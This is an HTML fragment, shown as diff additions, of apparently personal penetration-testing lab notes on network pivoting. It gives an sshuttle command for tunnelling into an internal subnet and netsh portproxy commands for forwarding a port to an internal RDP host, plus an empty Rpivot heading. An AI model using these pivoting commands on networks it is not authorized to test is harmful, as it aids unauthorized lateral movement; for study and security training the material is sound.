+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>No need to configure proxychains &ndash; only works for pivoting over ssh</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;background:gray;">Web Server Pivoting with Rpivot</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;">&nbsp;</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;">&nbsp;</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;background:fuchsia;">Port forwarding with Windows Netsh</span></p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Port forward</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Verifying Port Forward</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>netsh.exe interface portproxy show v4tov4</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
